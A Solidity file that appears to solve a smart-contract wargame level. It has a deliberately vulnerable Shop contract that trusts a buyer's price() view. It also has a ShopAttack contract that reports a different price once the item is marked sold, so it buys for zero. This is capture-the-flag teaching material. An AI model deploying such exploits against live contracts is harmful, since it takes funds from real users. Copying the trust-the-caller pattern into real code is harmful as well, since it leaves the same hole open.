// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopAttack is Buyer {
    
    Shop target; 

    constructor(address _address){
        target = Shop(_address);
    }

    function attack() external {
        target.buy();
    }

   function price() external view override returns (uint) {
       if(target.isSold()) {
           return 0; 
       } else {
           return target.price();
       }
   }

}